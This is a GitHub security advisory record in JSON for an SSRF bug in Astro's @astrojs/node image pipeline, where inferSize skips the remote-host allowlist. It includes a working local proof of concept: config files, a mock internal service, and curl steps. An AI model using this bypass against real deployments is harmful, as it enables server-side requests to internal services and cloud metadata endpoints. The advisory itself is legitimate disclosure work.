{
  "Severity": "MODERATE",
  "UpdatedAt": "2026-02-25T18:11:48Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@astrojs/node"
  },
  "Advisory": {
    "DatabaseId": 339243,
    "Id": "GSA_kwCzR0hTQS1jajlmLWg2cjYtNGN4Ms4ABS0r",
    "GhsaId": "GHSA-cj9f-h6r6-4cx2",
    "References": [
      {
        "Url": "https://github.com/withastro/astro/security/advisories/GHSA-cj9f-h6r6-4cx2"
      },
      {
        "Url": "https://github.com/withastro/astro/commit/e01e98b063e90d274c42130ec2a60cc0966622c9"
      },
      {
        "Url": "https://github.com/advisories/GHSA-cj9f-h6r6-4cx2"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-cj9f-h6r6-4cx2"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-27829"
      }
    ],
    "Description": "## Summary\n\nA bug in Astro's image pipeline allows bypassing `image.domains` / `image.remotePatterns` restrictions, enabling the server to fetch content from unauthorized remote hosts.\n\n## Details\n\nAstro provides an `inferSize` option that fetches remote images at render time to determine their dimensions. Remote image fetches are intended to be restricted to domains the site developer has manually authorized (using the `image.domains` or `image.remotePatterns` options).\n\nHowever, when `inferSize` is used, no domain validation is performed — the image is fetched from any host regardless of the configured restrictions. An attacker who can influence the image URL (e.g., via CMS content or user-supplied data) can cause the server to fetch from arbitrary hosts.\n\n## PoC\n\n\u003cdetails\u003e\n\n### Setup\n\nCreate a new Astro project with the following files:\n\n`package.json`:\n```json\n{\n  \"name\": \"poc-ssrf-infersize\",\n  \"private\": true,\n  \"scripts\": {\n    \"dev\": \"astro dev --port 4322\",\n    \"build\": \"astro build\"\n  },\n  \"dependencies\": {\n    \"astro\": \"5.17.2\",\n    \"@astrojs/node\": \"9.5.3\"\n  }\n}\n```\n\n`astro.config.mjs` — only `localhost:9000` is authorized:\n```javascript\nimport { defineConfig } from 'astro/config';\nimport node from '@astrojs/node';\n\nexport default defineConfig({\n  output: 'server',\n  adapter: node({ mode: 'standalone' }),\n  image: {\n    remotePatterns: [\n      { hostname: 'localhost', port: '9000' }\n    ]\n  }\n});\n```\n\n`internal-service.mjs` — simulates an internal service on a non-allowlisted host (`127.0.0.1:8888`):\n```javascript\nimport { createServer } from 'node:http';\nconst GIF = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');\ncreateServer((req, res) =\u003e {\n  console.log(`[INTERNAL] Received: ${req.method} ${req.url}`);\n  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': GIF.length });\n  res.end(GIF);\n}).listen(8888, '127.0.0.1', () =\u003e console.log('Internal service on 127.0.0.1:8888'));\n```\n\n`src/pages/test.astro`:\n```astro\n---\nimport { getImage } from 'astro:assets';\n\nconst result = await getImage({\n  src: 'http://127.0.0.1:8888/internal-api',\n  inferSize: true,\n  alt: 'test'\n});\n---\n\u003chtml\u003e\u003cbody\u003e\n  \u003cp\u003eWidth: {result.options.width}, Height: {result.options.height}\u003c/p\u003e\n\u003c/body\u003e\u003c/html\u003e\n```\n\n### Steps to reproduce\n\n1. Run `npm install` and start the internal service:\n\n```bash\nnode internal-service.mjs\n```\n\n2. Start the dev server:\n\n```bash\nnpm run dev\n```\n\n3. Request the page:\n\n```bash\ncurl http://localhost:4322/test\n```\n\n4. `internal-service.mjs` logs `Received: GET /internal-api` — the request was sent to `127.0.0.1:8888` despite only `localhost:9000` being in the allowlist.\n\n\u003c/details\u003e\n\n## Impact\n\nAllows bypassing `image.domains` / `image.remotePatterns` restrictions to make server-side requests to unauthorized hosts. This includes the risk of server-side request forgery (SSRF) against internal network services and cloud metadata endpoints.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-25T18:11:47Z",
    "Severity": "MODERATE",
    "Summary": "Astro is vulnerable to SSRF due to missing allowlist enforcement in remote image inferSize",
    "UpdatedAt": "2026-02-25T18:11:48Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 6.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "9.5.4"
      },
      "VulnerableVersionRange": "\u003e= 9.0.0, \u003c 9.5.4"
    }
  ]
}